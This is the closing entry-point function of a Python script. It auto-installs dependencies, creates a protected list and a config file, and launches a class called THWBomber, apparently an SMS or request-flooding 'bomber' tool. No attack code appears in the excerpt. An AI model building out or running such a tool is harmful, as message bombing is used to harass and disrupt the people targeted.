# 🚀 ENTRY POINT
# ==============================================
def main():
    try:
        # Check dependencies
        try:
            import requests
            import aiohttp
            import colorama
        except ImportError:
            print("Installing dependencies...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "aiohttp", "colorama"])
        
        # Create required files
        if not os.path.exists(PROTECTED_FILE):
            save_protected({})
        if not os.path.exists(CONFIG_FILE):
            save_config(DEFAULT_CONFIG)
        
        # Start application
        app = THWBomber()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n\n{C['Y']}⚠️ Exiting...{C['RS']}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{C['R']}❌ Fatal Error: {e}{C['RS']}")
        sys.exit(1)

if __name__ == "__main__":
    main()